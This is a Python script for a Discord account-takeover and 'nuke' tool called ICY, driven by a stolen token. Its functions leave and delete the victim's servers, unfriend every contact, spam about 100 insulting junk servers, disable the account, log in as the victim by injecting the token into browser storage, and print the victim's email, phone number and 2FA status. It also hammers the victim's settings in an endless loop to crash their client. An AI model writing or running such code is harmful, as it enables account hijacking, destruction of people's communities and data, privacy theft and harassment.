import discord, os, discord, requests, asyncio, sys, codecs, io, random, threading, pyfiglet
from discord.ext import commands
from discord.ext.commands import Bot
from pyfiglet import Figlet
from colorama import Fore, init
from selenium import webdriver
from datetime import datetime
from itertools import cycle


os.system('mode 80, 40')

init(convert=True)
clear = lambda: os.system('clear')
clear()

bot = commands.Bot(command_prefix='-', self_bot=True)
bot.remove_command("help")

custom_fig = Figlet(font='big')
print(custom_fig.renderText('ICY'))



print('\n')
token = input("Token : ")

head = {'Authorization': str(token)}
src = requests.get('https://discordapp.com/api/v6/users/@me', headers=head)

if src.status_code == 200:
    print('❤ Valid Token ❤ ')
    input("Press any key to continue...")
else:
    print(f'[{Fore.RED}-{Fore.RED}] ✣ Invalid token ✣ ')
    input("Press any key to exit...")
    exit(0)



print('\n')
print('1 - ULTIMATE NUKE (destroy their account)')
print('2 - mass unfriend')
print('3 - server leaver')
print('4 - SPAM SERVERS')
print('5 - DISABLE TOKEN')
print('6 - LOGIN WITH A TOKEN (only for pc)')
print('7 - GRAP TOKEN INFO')
print('8 - CRASH THE TOKEN OWNER DISCORD')
print('\n')

#### ultimate nuke
def nuke():
    print("Loading...")
    print('\n')
    
    @bot.event
    async def on_ready(times : int=100):
        
        print('STATUS : [ULTIMATE NUKE]')
        print('\n')
        print('1 - LEAVEING SERVERS')
        print('\n')

        for guild in bot.guilds:
            try:
                await guild.leave()
                print(f'left from [{guild.name}]')
            except:
                print(f'CANT LEAVE [{guild.name}]')
        print('\n')
        print('2 - DELETING OWNED SERVERS')
        print('\n')
        for guild in bot.guilds:
            try:
                await guild.delete()
                print(f'[{guild.name}] have been deleted')
            except:
                print(f'CANT delete [{guild.name}]')
        
        print('\n')
        print('3 - UNFRIENDING ALL FRIENDS')
        print('\n')

        for user in bot.user.friends:
            try:
                await user.remove_friend()
                print(f'unfriended {user}')
            except:
                print(f"can't unfriend {user}")
        
        print('\n')
        print('4 - SPAMMING SERVERS')
        print('\n')

        for i in range(times):
            await bot.create_guild('Icy fucked You', region=None, icon=None)
            print(f'{i} useless server created')
        print('\n')
        print('max server limit is [100]')
        print('\n')
        print('\n')
        print('5 - CRASHING DISCORD')       
        print('\n')

        print('\n')
        print('CRASHING THE TOKEN OWNER DISCORD...')
        print('IF YOU WANNA KEEP CRASHING HIS DISCORD KEEP THE TOOL WORKING')
        headers = {'Authorization': token}
        modes = cycle(["light", "dark"])
        while True:
            setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
            requests.patch("https://discord.com/api/v6/users/@me/settings", headers=headers, json=setting)


    bot.run(token, bot=False)


#### unfriender
def unfriender():
    print("Loading...")
    #bot.logout
    
    @bot.event
    async def on_ready():
        print('STATUS : [UNFRIENDER]')
    
        for user in bot.user.friends:
            try:
                await user.remove_friend()
                print(f'unfriended {user}')
            except:
                print(f"can't unfriend {user}")
        
        print('\n')
        print('[[restart tool]')
        print('\n')
    bot.run(token, bot=False)

#### server leaver
def leaver():
    print("Loading...")
    #bot.logout
    
    @bot.event
    async def on_ready():
        print('STATUS : [SERVER LEAVER]')

        for guild in bot.guilds:
            try:
                await guild.leave()
                print(f'left from [{guild.name}]')
            except:
                print(f'cant leave, but it will be deleted [{guild.name}]')

        for guild in bot.guilds:
            try:
                await guild.delete()
                print(f'[{guild.name}] have been deleted')
            except:
                print(f'CANT delete [{guild.name}]')    

        print('\n')
        print('[[LEAVING DONE, IF YOU WANNA USE THE TOOL AGAIN RESTART IT]')
        print('\n')

    bot.run(token, bot=False)
    

#### spam servers
def spamservers():
    print("Loading...")
    
    @bot.event
    async def on_ready(times: int=95):
        print('STATUS : [SERVER SPAMMER]')
        
        for i in range(times):
            await bot.create_guild('Icy Fucked You', region=None, icon=None)
            print(f'{i} useless server created')
    
        print('max server limit is [100]')
        print('\n')
        print('[[SPAMMING DONE, IF YOU WANNA USE THE TOOL AGAIN RESTART IT]')
        print('\n')
        input()
    bot.run(token, bot=False)


def tokenDisable(token):
    print('STATUS : [DISABLING TOKEN]')
    r = requests.patch('https://discordapp.com/api/v6/users/@me', headers={'Authorization': token})
    if r.status_code == 400:
        print(f'[{Fore.RED}+{Fore.RESET}] Account disabled successfully')
        input("Press any key to exit...")
    else:
        print(f'[{Fore.RED}-{Fore.RESET}] Invalid token')
        input("Press any key to exit...")

def tokenLogin(token):
    print('STATUS : [LOGIN WITH TOKEN]')
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }
            """
    driver.get("https://discord.com/login")
    driver.execute_script(script + f'\nlogin("{token}")')

def tokenInfo(token):
    print('STATUS : [TOKEN INFO]')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
            userName = r.json()['username'] + '#' + r.json()['discriminator']
            userID = r.json()['id']
            phone = r.json()['phone']
            email = r.json()['email']
            mfa = r.json()['mfa_enabled']
            print(f'''
            [{Fore.RED}User ID{Fore.RESET}]         {userID}
            [{Fore.RED}User Name{Fore.RESET}]       {userName}
            [{Fore.RED}2 Factor{Fore.RESET}]        {mfa}
            [{Fore.RED}Email{Fore.RESET}]           {email}
            [{Fore.RED}Phone number{Fore.RESET}]    {phone if phone else ""}
            [{Fore.RED}Token{Fore.RESET}]           {token}
            ''')
            input()

def crashdiscord(token):
    print('STATUS : [DISCORD CRASHER]')
    print('\n')
    print('CRASHING THE TOKEN OWNER DISCORD...')
    print('IF YOU WANNA KEEP CRASHING HIS DISCORD KEEP THE TOOL WORKING')
    headers = {'Authorization': token}
    modes = cycle(["light", "dark"])
    while True:
        setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch("https://discord.com/api/v6/users/@me/settings", headers=headers, json=setting)


def mainanswer():
    answer = input('Choose : ')
    if answer == '1':
        nuke()
    elif answer == '2':
        unfriender()
    elif answer == '3':
        leaver()
    elif answer == '4':
        spamservers()
    elif answer == '5':
        tokenDisable(token)
    elif answer == '6':
        tokenLogin(token)
    elif answer == '7':
        tokenInfo(token)
    elif answer == '8':
        crashdiscord(token)
    else:
        print('wrong input, please choose a number')
        mainanswer()

mainanswer()






